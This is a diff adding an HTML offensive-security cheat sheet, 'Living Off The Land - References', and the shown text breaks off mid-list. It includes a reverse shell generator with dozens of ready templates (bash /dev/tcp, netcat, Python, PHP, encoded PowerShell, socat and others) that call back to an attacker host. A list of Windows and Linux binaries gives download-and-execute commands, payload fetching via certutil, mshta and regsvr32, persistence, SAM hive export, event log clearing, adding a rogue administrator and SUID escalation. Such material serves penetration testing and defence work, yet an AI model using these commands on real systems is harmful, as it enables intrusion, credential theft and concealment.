@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Living Off The Land - References</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0a0a0a; color: #e0e0e0; padding: 20px; }
+        .container { max-width: 1400px; margin: 0 auto; }
+        h1 { text-align: center; color: #00ff41; margin-bottom: 10px; font-size: 2.2em; text-shadow: 0 0 10px #00ff4150; }
+        
+        .credits { text-align: center; margin-bottom: 25px; font-size: 13px; color: #888; }
+        .credits h2 { font-size: 1.2em; color: #ccc; margin-bottom: 8px; }
+        .credits a { color: #00ff41; text-decoration: none; padding: 0 10px; }
+        .credits a:hover { text-decoration: underline; }
+
+        .shell-generator {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 5px;
+            margin-bottom: 25px;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+        .shell-generator.collapsed { height: 70px; }
+        .shell-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 20px;
+            cursor: pointer;
+            user-select: none;
+        }
+        .shell-header h2 { color: #00ff41; margin: 0; }
+        .toggle-btn {
+            background: none;
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            padding: 5px 10px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.3s;
+        }
+        .toggle-btn:hover { background: #00ff41; color: #000; }
+        .shell-content {
+            padding: 0 20px 20px;
+            transition: all 0.3s ease;
+        }
+        .shell-generator.collapsed .shell-content { display: none; }
+        .shell-controls { display: flex; flex-wrap: wrap; gap: 15px; margin-bottom: 15px; }
+        .shell-controls > * { flex: 1; min-width: 150px; }
+        .shell-generator input, .shell-generator select {
+            padding: 12px;
+            font-size: 16px;
+            background: #0d0d0d;
+            border: 1px solid #333;
+            color: #e0e0e0;
+            border-radius: 5px;
+        }
+        .shell-generator button {
+            padding: 12px 20px;
+            background: #00ff41;
+            border: none;
+            color: #000;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: all 0.3s;
+            font-size: 16px;
+        }
+        .shell-generator button:hover { background: #fff; }
+        #shell-output-container {
+            background: #0d0d0d;
+            border: 1px solid #333;
+            border-radius: 3px;
+            padding: 15px;
+            margin-top: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            overflow-x: auto;
+            position: relative;
+        }
+        #shell-output-container .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+        }
+        
+        .controls { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
+        .search-box { flex: 1; min-width: 300px; padding: 12px; font-size: 16px; background: #1a1a1a; border: 2px solid #00ff41; color: #e0e0e0; border-radius: 5px; }
+        .search-box:focus { outline: none; box-shadow: 0 0 10px #00ff4180; }
+        .filters { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
+        .filter-btn { padding: 8px 16px; background: #1a1a1a; border: 1px solid #333; color: #e0e0e0; cursor: pointer; border-radius: 5px; transition: all 0.3s; font-size: 14px; }
+        .filter-btn:hover { border-color: #00ff41; }
+        .filter-btn.active { background: #00ff41; color: #000; border-color: #00ff41; }
+        .stats { text-align: center; margin-bottom: 20px; color: #888; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 15px; }
+        .card { background: #1a1a1a; border: 1px solid #333; padding: 15px; border-radius: 5px; transition: all 0.3s; display: flex; flex-direction: column; }
+        .card:hover { border-color: #00ff41; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,255,65,0.2); }
+        .card h3 { color: #00ff41; margin-bottom: 8px; font-family: 'Courier New', monospace; }
+        .badges { display: flex; gap: 5px; flex-wrap: wrap; margin-bottom: 10px; }
+        .badge { display: inline-block; padding: 2px 8px; background: #333; border-radius: 3px; font-size: 11px; }
+        .badge.windows { background: #0078d4; }
+        .badge.linux { background: #ff6b00; }
+        .badge.category { background: #6b42ff; }
+        .badge.suid { background: #ff1744; }
+        .badge.sudo { background: #ff9100; }
+        .badge.capabilities { background: #00e676; }
+        .card .desc { color: #bbb; font-size: 14px; margin-bottom: 10px; flex-grow: 1; }
+        .usage { background: #0d0d0d; border: 1px solid #333; border-radius: 3px; padding: 10px; margin-top: 10px; font-family: 'Courier New', monospace; font-size: 12px; overflow-x: auto; position: relative; }
+        .usage-title { color: #00ff41; font-size: 11px; margin-bottom: 5px; font-weight: bold; }
+        .hidden { display: none !important; }
+        .highlight { background: #00ff4130; padding: 0 2px; }
+        .copy-btn { background: #333; border: none; color: #00ff41; padding: 4px 8px; border-radius: 3px; cursor: pointer; font-size: 11px; }
+        .copy-btn:hover { background: #444; }
+        .usage .copy-btn { position: absolute; top: 8px; right: 8px; }
+        
+        /* Ensure pre tags don't interpret HTML */
+        pre { white-space: pre-wrap; word-wrap: break-word; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔓 Living Off The Land - References</h1>
+
+        <div class="credits">
+            <h2>Sources &amp; Credits</h2>
+            <p>This page is an aggregated collection of techniques from the amazing open-source projects below. Please support them.</p>
+            <p>
+                <a href="https://lolbas-project.github.io/" target="_blank">LOLBAS</a> |
+                <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> |
+                <a href="https://wadcoms.github.io/" target="_blank">WADComs</a> |
+                <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank">PayloadsAllTheThings</a>
+            </p>
+        </div>
+
+        <div class="shell-generator" id="shell-generator">
+            <div class="shell-header" onclick="toggleShellGenerator()">
+                <h2>🐚 Reverse Shell Generator</h2>
+                <button class="toggle-btn" id="toggle-btn">Minimize</button>
+            </div>
+            <div class="shell-content">
+                <div class="shell-controls">
+                    <select id="shell-type"></select>
+                    <input type="text" id="shell-ip" placeholder="LHOST (e.g. 10.10.10.5)">
+                    <input type="text" id="shell-port" placeholder="LPORT (e.g. 4444)">
+                    <button id="generate-shell-btn">Generate</button>
+                </div>
+                <div id="shell-output-container" class="hidden">
+                    <button class="copy-btn" id="shell-copy-btn">Copy</button>
+                    <pre id="shell-output"></pre>
+                </div>
+            </div>
+        </div>
+        <div class="controls">
+            <input type="text" class="search-box" placeholder="Search binaries, descriptions, or commands..." autofocus>
+            <div class="filters">
+                <button class="filter-btn active" data-filter="all">All</button>
+                <button class="filter-btn" data-filter="windows">Windows</button>
+                <button class="filter-btn" data-filter="linux">Linux</button>
+                <button class="filter-btn" data-filter="execution">Execution</button>
+                <button class="filter-btn" data-filter="download">Download</button>
+                <button class="filter-btn" data-filter="credentials">Credentials</button>
+                <button class="filter-btn" data-filter="bypass">Bypass</button>
+                <button class="filter-btn" data-filter="persistence">Persistence</button>
+                <button class="filter-btn" data-filter="suid">SUID</button>
+                <button class="filter-btn" data-filter="sudo">Sudo</button>
+                <button class="filter-btn" data-filter="file-read">File Read</button>
+                <button class="filter-btn" data-filter="file-write">File Write</button>
+                <button class="filter-btn" data-filter="capabilities">Capabilities</button>
+                <button class="filter-btn" data-filter="library-load">Library Load</button>
+            </div>
+        </div>
+        <div class="stats">Total: <span id="total">0</span> | Visible: <span id="visible">0</span></div>
+        <div class="grid" id="grid"></div>
+    </div>
+    <script>
+        // Toggle shell generator
+        function toggleShellGenerator() {
+            const generator = document.getElementById('shell-generator');
+            const toggleBtn = document.getElementById('toggle-btn');
+            generator.classList.toggle('collapsed');
+            toggleBtn.textContent = generator.classList.contains('collapsed') ? 'Expand' : 'Minimize';
+        }
+
+        // Expanded reverse shell collection
+        const reverseShells = {
+            // Bash variants
+            "bash-tcp": { name: "Bash TCP", template: "bash -i >& /dev/tcp/##LHOST##/##LPORT## 0>&1" },
+            "bash-udp": { name: "Bash UDP", template: "bash -i >& /dev/udp/##LHOST##/##LPORT## 0>&1" },
+            "bash-196": { name: "Bash 196", template: "0<&196;exec 196<>/dev/tcp/##LHOST##/##LPORT##; bash <&196 >&196 2>&196" },
+            "bash-readline": { name: "Bash readline", template: "exec 5<>/dev/tcp/##LHOST##/##LPORT##;cat <&5 | while read line; do $line 2>&5 >&5; done" },
+            "bash-5": { name: "Bash 5", template: "bash -i 5<> /dev/tcp/##LHOST##/##LPORT## 0<&5 1>&5 2>&5" },
+            
+            // sh variants
+            "sh-tcp": { name: "sh TCP", template: "sh -i >& /dev/tcp/##LHOST##/##LPORT## 0>&1" },
+            "sh-udp": { name: "sh UDP", template: "sh -i >& /dev/udp/##LHOST##/##LPORT## 0>&1" },
+            
+            // nc/netcat variants
+            "nc-e": { name: "nc -e", template: "nc -e /bin/bash ##LHOST## ##LPORT##" },
+            "nc-e-sh": { name: "nc -e /bin/sh", template: "nc -e /bin/sh ##LHOST## ##LPORT##" },
+            "nc-c": { name: "nc -c", template: "nc -c /bin/bash ##LHOST## ##LPORT##" },
+            "nc-mkfifo": { name: "nc mkfifo", template: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ##LHOST## ##LPORT## >/tmp/f" },
+            "nc-mknod": { name: "nc mknod", template: "rm /tmp/l;mknod /tmp/l p;nc ##LHOST## ##LPORT## 0</tmp/l | /bin/bash 1>/tmp/l" },
+            
+            // ncat variants
+            "ncat-e": { name: "ncat -e", template: "ncat ##LHOST## ##LPORT## -e /bin/bash" },
+            "ncat-udp": { name: "ncat UDP", template: "ncat --udp ##LHOST## ##LPORT## -e /bin/bash" },
+            "ncat-ssl": { name: "ncat SSL", template: "ncat --ssl ##LHOST## ##LPORT## -e /bin/bash" },
+            
+            // Python variants
+            "python": { name: "Python", template: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"##LHOST##\",##LPORT##));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'" },
+            "python3": { name: "Python3", template: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"##LHOST##\",##LPORT##));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'" },
+            "python-short": { name: "Python short", template: "python -c 'import os; os.system(\"bash -i >& /dev/tcp/##LHOST##/##LPORT## 0>&1\")'" },
+            "python-pty": { name: "Python PTY", template: "python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"##LHOST##\",##LPORT##));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'" },
+            
+            // PHP variants
+            "php-exec": { name: "PHP exec", template: "php -r '$sock=fsockopen(\"##LHOST##\",##LPORT##);exec(\"/bin/bash -i <&3 >&3 2>&3\");'" },
+            "php-shell-exec": { name: "PHP shell_exec", template: "php -r '$sock=fsockopen(\"##LHOST##\",##LPORT##);shell_exec(\"/bin/bash -i <&3 >&3 2>&3\");'" },
+            "php-system": { name: "PHP system", template: "php -r '$sock=fsockopen(\"##LHOST##\",##LPORT##);system(\"/bin/bash -i <&3 >&3 2>&3\");'" },
+            "php-passthru": { name: "PHP passthru", template: "php -r '$sock=fsockopen(\"##LHOST##\",##LPORT##);passthru(\"/bin/bash -i <&3 >&3 2>&3\");'" },
+            "php-popen": { name: "PHP popen", template: "php -r '$sock=fsockopen(\"##LHOST##\",##LPORT##);popen(\"/bin/bash -i <&3 >&3 2>&3\", \"r\");'" },
+            "php-proc-open": { name: "PHP proc_open", template: "php -r '$sock=fsockopen(\"##LHOST##\",##LPORT##);$proc=proc_open(\"/bin/bash\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'" },
+            
+            // PowerShell variants
+            "powershell": { name: "PowerShell #1", template: "$client = New-Object System.Net.Sockets.TCPClient(\"##LHOST##\",##LPORT##);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" },
+            "powershell-ssl": { name: "PowerShell SSL", template: "$TCPClient = New-Object Net.Sockets.TCPClient('##LHOST##', ##LPORT##);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('localhost',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()" },
+            "powershell-base64": { name: "PowerShell Base64", template: "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAIwAjAEwASABPAFMAVAAjACMAIgAsACMAIwBMAFAATwBSAFQAIwAjACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" },
+            
+            // Perl variants
+            "perl": { name: "Perl", template: "perl -e 'use Socket;$i=\"##LHOST##\";$p=##LPORT##;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'" },
+            "perl-no-sh": { name: "Perl no sh", template: "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"##LHOST##:##LPORT##\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'" },
+            
+            // Ruby variants
+            "ruby": { name: "Ruby", template: "ruby -rsocket -e'f=TCPSocket.open(\"##LHOST##\",##LPORT##).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'" },
+            "ruby-no-sh": { name: "Ruby no sh", template: "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"##LHOST##\",\"##LPORT##\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'" },
+            
+            // Node.js variants
+            "nodejs": { name: "Node.js", template: "require('child_process').exec('nc -e /bin/bash ##LHOST## ##LPORT##')" },
+            "nodejs-2": { name: "Node.js #2", template: "(function(){var net = require(\"net\"),cp = require(\"child_process\"),sh = cp.spawn(\"/bin/bash\", []);var client = new net.Socket();client.connect(##LPORT##, \"##LHOST##\", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();" },
+            
+            // Java variants
+            "java": { name: "Java", template: "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/##LHOST##/##LPORT##;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor();" },
+            "java-two-way": { name: "Java Two Way", template: "String host=\"##LHOST##\";int port=##LPORT##;String cmd=\"/bin/bash\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();" },
+            
+            // Groovy
+            "groovy": { name: "Groovy", template: "String host=\"##LHOST##\";int port=##LPORT##;String cmd=\"/bin/bash\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();" },
+            
+            // Golang
+            "golang": { name: "Golang", template: "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"##LHOST##:##LPORT##\");cmd:=exec.Command(\"/bin/bash\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go" },
+            
+            // Lua
+            "lua": { name: "Lua", template: "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('##LHOST##','##LPORT##');os.execute('/bin/bash -i <&3 >&3 2>&3');\"" },
+            "lua-2": { name: "Lua #2", template: "lua5.1 -e 'local host, port = \"##LHOST##\", ##LPORT## local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'" },
+            
+            // AWK variants
+            "awk": { name: "AWK", template: "awk 'BEGIN {s = \"/inet/tcp/0/##LHOST##/##LPORT##\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null" },
+            
+            // socat variants
+            "socat": { name: "Socat", template: "socat TCP:##LHOST##:##LPORT## EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane" },
+            "socat-tty": { name: "Socat TTY", template: "socat TCP:##LHOST##:##LPORT## EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane" },
+            
+            // Telnet
+            "telnet": { name: "Telnet", template: "rm -f /tmp/p; mknod /tmp/p p && telnet ##LHOST## ##LPORT## 0/tmp/p" },
+            "telnet-mkfifo": { name: "Telnet mkfifo", template: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|telnet ##LHOST## ##LPORT## >/tmp/f" },
+            
+            // zsh
+            "zsh": { name: "zsh", template: "zsh -c 'zmodload zsh/net/tcp && ztcp ##LHOST## ##LPORT## && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'" },
+            
+            // xterm
+            "xterm": { name: "xterm", template: "xterm -display ##LHOST##:##LPORT##" },
+            
+            // OpenSSL
+            "openssl": { name: "OpenSSL", template: "rm -f /tmp/s; mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ##LHOST##:##LPORT## > /tmp/s; rm /tmp/s" },
+            "openssl-2": { name: "OpenSSL #2", template: "mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ##LHOST##:##LPORT## > /tmp/s 2> /dev/null; rm /tmp/s" },
+            
+            // Rustcat
+            "rustcat": { name: "Rustcat", template: "rcat ##LHOST## ##LPORT## -r /bin/bash" },
+            
+            // Pwncat
+            "pwncat": { name: "Pwncat", template: "pwncat -e /bin/bash ##LHOST## ##LPORT##" }
+        };
+
+        // Expanded binary data with new categories
+        const binaries = [
+            // Windows - Execution
+            {name: "powershell.exe", os: "windows", categories: ["execution", "download", "bypass"], desc: "Execute scripts, download files, bypass policies", usage: "# Download and execute\npowershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/script.ps1')\"\n\n# Encoded command\npowershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADAALgAwAC4AMQAvAHMAYwByAGkAcAB0AC4AcABzADEAJwApAA=="},
+            {name: "cmd.exe", os: "windows", categories: ["execution"], desc: "Command execution", usage: "# Execute command\ncmd.exe /c whoami\n\n# Execute with output redirection\ncmd.exe /c \"whoami > C:\\temp\\output.txt\""},
+            {name: "rundll32.exe", os: "windows", categories: ["execution", "bypass"], desc: "Execute DLL payloads", usage: "# Execute DLL\nrundll32.exe C:\\path\\to\\payload.dll,EntryPoint\n\n# JavaScript execution\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert('test');"},
+            {name: "regsvr32.exe", os: "windows", categories: ["execution", "bypass"], desc: "Execute scripts via COM scriptlets", usage: "# Remote scriptlet\nregsvr32.exe /s /n /u /i:http://10.0.0.1/file.sct scrobj.dll\n\n# Local scriptlet\nregsvr32.exe /s /n /u /i:file.sct scrobj.dll"},
+            {name: "mshta.exe", os: "windows", categories: ["execution", "download", "bypass"], desc: "Execute HTA files and JavaScript", usage: "# Remote HTA\nmshta.exe http://10.0.0.1/malicious.hta\n\n# Inline JavaScript\nmshta.exe javascript:alert('test');close();"},
+            {name: "wmic.exe", os: "windows", categories: ["execution", "bypass"], desc: "WMI command-line utility for script execution or information gathering.", usage: "# Remote process creation\nwmic.exe /node:REMOTE_COMPUTER process call create \"cmd.exe /c calc.exe\"\n\n# Execute from remote XSL stylesheet\nwmic.exe process get /format:\"http://10.0.0.1/payload.xsl\""},
+            {name: "cscript.exe", os: "windows", categories: ["execution"], desc: "Execute VBScript/JScript", usage: "# Execute VBScript\ncscript.exe C:\\path\\to\\script.vbs\n\n# Execute JScript\ncscript.exe C:\\path\\to\\script.js"},
+            {name: "wscript.exe", os: "windows", categories: ["execution"], desc: "Windows Script Host", usage: "# Execute script\nwscript.exe C:\\path\\to\\script.vbs\n\n# With specific engine\nwscript.exe //e:vbscript C:\\path\\to\\script.txt"},
+            {name: "msiexec.exe", os: "windows", categories: ["execution", "download"], desc: "Execute MSI packages, can be used for installation from a remote source.", usage: "# Remote MSI installation\nmsiexec.exe /q /i http://10.0.0.1/malicious.msi\n\n# Local MSI with quiet execution\nmsiexec.exe /q /i C:\\path\\to\\package.msi"},
+            {name: "msdt.exe", os: "windows", categories: ["execution", "bypass"], desc: "Microsoft Support Diagnostic Tool, can be used to execute code via crafted diagnostics.", usage: "# Follina - Execute with answer file\nmsdt.exe /id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu\""},
+            {name: "msbuild.exe", os: "windows", categories: ["execution", "bypass"], desc: "Build engine abuse using a crafted project file.", usage: "# Execute tasks from a project file\nmsbuild.exe C:\\path\\to\\malicious.csproj"},
+            {name: "installutil.exe", os: "windows", categories: ["execution", "bypass"], desc: ".NET installer utility abuse for executing unsigned code.", usage: "# Execute .NET assembly\ninstallutil.exe /logfile= /LogToConsole=false /U C:\\path\\to\\payload.exe"},
+            {name: "regasm.exe", os: "windows", categories: ["execution", "bypass"], desc: ".NET assembly registration utility, can execute code from DLLs.", usage: "# Register and execute assembly\nregasm.exe /U C:\\path\\to\\payload.dll"},
+            {name: "odbcconf.exe", os: "windows", categories: ["execution", "bypass"], desc: "ODBC driver configuration tool to execute DLLs.", usage: "# Execute DLL\nodbcconf.exe /s /a {regsvr C:\\path\\to\\payload.dll}"},
+            {name: "cmstp.exe", os: "windows", categories: ["execution", "bypass"], desc: "Connection Manager Profile Installer for executing commands from an INF file.", usage: "# Execute INF script\ncmstp.exe /ni /s C:\\path\\to\\malicious.inf"},
+
+            // Windows - Download
+            {name: "certutil.exe", os: "windows", categories: ["download", "bypass"], desc: "Certificate utility that can download and encode/decode files.", usage: "# Download file\ncertutil.exe -urlcache -f http://10.0.0.1/payload.exe payload.exe\n\n# Decode base64 file\ncertutil.exe -decode encoded.txt decoded.exe"},
+            {name: "bitsadmin.exe", os: "windows", categories: ["download", "persistence"], desc: "BITS administration utility for downloading or uploading files.", usage: "# Download file\nbitsadmin.exe /transfer job http://10.0.0.1/payload.exe C:\\temp\\payload.exe\n\n# Create persistent download job\nbitsadmin.exe /create /download job\nbitsadmin.exe /addfile job http://10.0.0.1/payload.exe C:\\temp\\payload.exe\nbitsadmin.exe /resume job"},
+            {name: "finger.exe", os: "windows", categories: ["download", "exfiltration"], desc: "Finger client can be used to exfiltrate data to a listening server.", usage: "# Exfiltrate data\nfinger.exe user@10.0.0.1" },
+            
+            // Windows - Persistence
+            {name: "schtasks.exe", os: "windows", categories: ["persistence", "execution"], desc: "Task scheduler to run programs at specific times or on events.", usage: "# Create scheduled task for hourly execution\nschtasks.exe /create /tn \"Updater\" /tr \"C:\\temp\\payload.exe\" /sc hourly\n\n# Create task on user logon\nschtasks.exe /create /tn \"UserLogonTask\" /tr \"payload.exe\" /sc onlogon"},
+            {name: "sc.exe", os: "windows", categories: ["persistence", "bypass"], desc: "Service controller for creating and managing system services.", usage: "# Create and start a new service\nsc.exe create NewSvc binpath= \"C:\\temp\\payload.exe\"\nsc.exe start NewSvc"},
+            {name: "reg.exe", os: "windows", categories: ["persistence", "credentials"], desc: "Registry editor for modifying run keys or other persistence locations.", usage: "# Add Run key for current user\nreg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"C:\\temp\\payload.exe\"\n\n# Export SAM database\nreg.exe save HKLM\\SAM C:\\temp\\sam.hive"},
+
+            // Windows - Credentials
+            {name: "wevtutil.exe", os: "windows", categories: ["bypass", "credentials"], desc: "Event log utility used for clearing or exporting logs.", usage: "# Clear Security event log\nwevtutil.exe cl Security\n\n# Export logs for offline analysis\nwevtutil.exe epl Security C:\\temp\\security.evtx"},
+            {name: "net.exe", os: "windows", categories: ["credentials", "persistence", "recon"], desc: "Network configuration and user management.", usage: "# Add a local administrator\nnet user /add eviladmin P@ssw0rd1\nnet localgroup administrators eviladmin /add\n\n# View shares on a remote computer\nnet view \\\\REMOTE_PC"},
+            {name: "nltest.exe", os: "windows", categories: ["credentials", "recon"], desc: "Domain trust and information utility.", usage: "# Get list of domain controllers\nnltest.exe /dclist:domain.com\n\n# Find domain trusts\nnltest.exe /trusted_domains"},
+            {name: "netsh.exe", os: "windows", categories: ["credentials", "persistence", "bypass"], desc: "Network shell for configuration, can dump WiFi keys or set up port forwarding.", usage: "# Dump WiFi passwords\nnetsh.exe wlan show profile name=\"WiFiName\" key=clear\n\n# Port proxy/forwarding for persistence\nnetsh.exe interface portproxy add v4tov4 listenport=8080 connectaddress=10.0.0.1 connectport=80"},
+
+            // Linux - Basic Shells and Execution
+            {name: "bash", os: "linux", categories: ["execution", "suid", "sudo"], desc: "Bourne Again Shell, used for reverse shells and script execution.", usage: "# Reverse shell\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n\n# SUID privilege escalation\n./bash -p\n\n# Sudo\nsudo bash"},
+            {name: "sh", os: "linux", categories: ["execution", "suid", "sudo"], desc: "Bourne shell", usage: "# Execute command\nsh -c 'id'\n\n# SUID\n./sh -p\n\n# Sudo\nsudo sh"},
+            {name: "dash", os: "linux", categories: ["execution", "suid"], desc: "Debian Almquist shell", usage: "# Execute command\ndash -c 'id'\n\n# SUID\n./dash -p"},
